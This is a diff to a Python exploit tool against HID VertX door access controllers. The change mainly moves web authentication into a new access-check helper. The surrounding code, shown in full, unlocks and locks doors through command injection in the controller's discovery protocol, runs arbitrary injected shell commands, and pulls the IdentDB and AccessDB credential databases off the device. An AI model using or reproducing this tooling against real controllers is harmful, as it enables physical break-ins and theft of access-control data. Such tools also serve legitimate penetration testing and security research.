@@ -34,7 +34,7 @@ class Actions(object):
 	"""
 	Perform actions on VertX controller.
 	"""
-	def __init__(self, ip, username=None, password=None):
+	def __init__(self, ip):
 		self.utils = Helpers()
 		self.session = requests.Session()
 		self.HEADERS = {
@@ -49,9 +49,6 @@ class Actions(object):
 		self.DISCOVER = 'discover;013;'
 
 		self.ip = ip
-		self.username = username
-		self.password = password
-
 		self.vertx_info = {}
 
 	def discover(self):
@@ -59,7 +56,7 @@ class Actions(object):
 		Discover VertX controllers on the local network or range of IP addresses.
 		Returns
 		----------
-			controllers : list
+			list
 		"""
 		controllers = []
 
@@ -90,7 +87,7 @@ class Actions(object):
 			VertX EVO and EDGE EVO controllers patched with firmware > 3.5.1.1483
 		Returns
 		----------
-			vertx_info : dict
+			dict
 		"""
 		response = self._send_command(self.DISCOVER)
 		if response:
@@ -128,7 +125,7 @@ class Actions(object):
 		Using command injection, unlock doors connected to the VertX controller.
 		Returns
 		----------
-			response : str
+			str
 		"""
 		commands = [
 			"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(self.vertx_info['model']),
@@ -142,19 +139,29 @@ class Actions(object):
 			response = self._send_command(self.BLINK_ON, payload)
 			if response[0].split(';')[0] == 'ack':
 				self.utils.print_status('Executing payload')
-				response = self._execute_payload(self.vertx_info['mac'])
+				response = self._execute_payload()
 
 		return response
 
-	def web_unlock(self):
+	def web_unlock(self, username, password):
 		"""
 		Using the web interface, unlock doors connected to the VertX controller.
+		Parameters
+		----------
+			username : string
+				Username to use for authentication.
+			password : string
+				Password to use for authentication.
 		Returns
 		----------
-			response : str
+			str
 		"""
-		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=1&MS={3}406".format(self.vertx_info['external_ip'], self.vertx_info['model'], int(time.time())),
-		response = self._web_request(url)
+		status = self._check_access(username, password)
+		if status:
+			url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=1&MS={3}406".format(self.vertx_info['external_ip'], self.vertx_info['model'], int(time.time()))
+			response = self._web_request(url)
+		else:
+			response = status
 
 		return response
 
@@ -163,7 +170,7 @@ class Actions(object):
 		Using command injection, lock doors connected to the VertX controller.
 		Returns
 		----------
-			response : str
+			str
 		"""
 		commands = [
 			'chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
@@ -177,19 +184,29 @@ class Actions(object):
 			response = self._send_command(self.BLINK_ON, payload)
 			if response[0].split(';')[0] == 'ack':
 				self.utils.print_status('Executing payload')
-				response = self._execute_payload(self.vertx_info['mac'])
+				response = self._execute_payload()
 
 		return response
 
-	def web_lock(self):
+	def web_lock(self, username, password):
 		"""
 		Using the web interface, lock doors connected to the VertX controller.
+		Parameters
+		----------
+			username : string
+				Username to use for authentication.
+			password : string
+				Password to use for authentication.
 		Returns
 		----------
-			response : str
+			str
 		"""
-		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=0&MS={3}406".format(self.vertx_info['external_ip'], self.vertx_info['model'], int(time.time())),
-		response = self.web_request(url)
+		status = self._check_access(username, password)
+		if status:
+			url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=0&MS={3}406".format(self.vertx_info['external_ip'], self.vertx_info['model'], int(time.time())),
+			response = self._web_request(url)
+		else:
+			response = status
 
 		return response
 
@@ -203,19 +220,19 @@ class Actions(object):
 			Example : ping -c 3 192.168.1.39
 		Returns
 		----------
-			response : str
+			str
 		"""
 		payload = "{0};1`{1}`;".format(self.vertx_info['mac'], command)
 		response = self._send_command(self.BLINK_ON, payload)
 
 		return response
 
-	def download(self):
+	def download(self, username, password):
 		"""
 		Download IdentDB and AccessDB from VertX controller.
 		Returns
 		----------
-			databases : dict
+			dict
 		"""
 		databases = {
 			'IdentDB': None,
@@ -230,36 +247,39 @@ class Actions(object):
 			'rm /mnt/apps/web/AccessDB'
 		]
 
-		payload_chunks = self._chunk(commands)
-		for chunk in payload_chunks:
-			payload = "{0};1`echo '{1}' >> /tmp/a`;".format(self.vertx_info['mac'], chunk)
-			response = self._send_command(self.BLINK_ON, payload)
-			if response[0].split(';')[0] != 'ack':
-				return databases
+		status = self._check_access(username, password)
+		if status:
+			payload_chunks = self._chunk(commands)
+			for chunk in payload_chunks:
+				payload = "{0};1`echo '{1}' >> /tmp/a`;".format(self.vertx_info['mac'], chunk)
+				response = self._send_command(self.BLINK_ON, payload)
+				if response[0].split(';')[0] != 'ack':
+					return databases
 
-		for database in databases:
-			try:
-				response = self.session.get(
-					"http://{0}/{1}".format(self.ip, database),
-					headers=self.HEADERS,
-					auth=(self.username, self.password),
-					stream=True,
-					verify=False
-				)
-
-			except requests.exceptions.RequestException as error:
-				raise Exception(error)
-			else:
-				if response.status_code == 200:
-					databases[database] = True
-					with open(database, 'wb') as f:
-						for chunk in response.iter_content(chunk_size=1024):
-							f.write(chunk)
-					f.close()
-				elif response.status_code == 401:
-					databases[database] = False
+			for database in databases:
+				try:
+					response = self.session.get(
+						"http://{0}/{1}".format(self.ip, database),
+						headers=self.HEADERS,
+						stream=True,
+						verify=False
+					)
+				except requests.exceptions.RequestException as error:
+					raise Exception(error)
 				else:
-					databases[database] = None
+					if response.status_code == 200:
+						databases[database] = True
+						with open(database, 'wb') as f:
+							for chunk in response.iter_content(chunk_size=1024):
+								f.write(chunk)
+						f.close()
+					elif response.status_code == 401:
+						databases[database] = False
+					else:
+						databases[database] = None
+		else:
+			databases['IdentDB'] = status
+			databases['AccessDB'] = status
 
 		return databases
 
@@ -283,7 +303,7 @@ class Actions(object):
 		Format the uploaded script, then execute.
 		Returns
 		----------
-			response : str
+			str
 		"""
 		commands = {
 			'format': [
@@ -320,7 +340,7 @@ class Actions(object):
 				Command injection payload.
 		Returns
 		----------
-			response : str
+			str
 		"""
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		s.settimeout(5)
@@ -343,6 +363,42 @@ class Actions(object):
 
 		return response
 
+	def _check_access(self, username, password):
+		"""
+		Check access to the VertX web interface.
+		Parameters
+		----------
+			ip : string
+				IP of the VertX controller.
+			username : string
+				Username to use for authentication.
+			password : string
+				Password to use for authentication.
+		Returns
+		----------
+			bool
+		"""
+		if username and password:
+			self.session.auth = (username, password)
+
+		try:
+			response = self.session.get(
+				"http://{0}".format(self.ip),
+				headers=self.HEADERS,
+				verify=False
+			)
+		except requests.exceptions.RequestException as error:
+			status = None
+		else:
+			if response.status_code == 200:
+				status = True
+			elif response.status_code == 401:
+				status = False
+			else:
+				status = None
+
+		return status
+
 	def _web_request(self, url):
 		"""
 		Trigger door unlock and lock through the web interface.
@@ -352,13 +408,12 @@ class Actions(object):
 				URL endpont to trigger on the VertX web interface.
 		Returns
 		----------
-			response : str
+			str
 		"""
 		try:
 			request = self.session.get(
 				url,
 				headers=self.HEADERS,
-				auth=(self.username, self.password),
 				verify=False
 			)
 			response = dict(status=request.status.code, text=request.text)
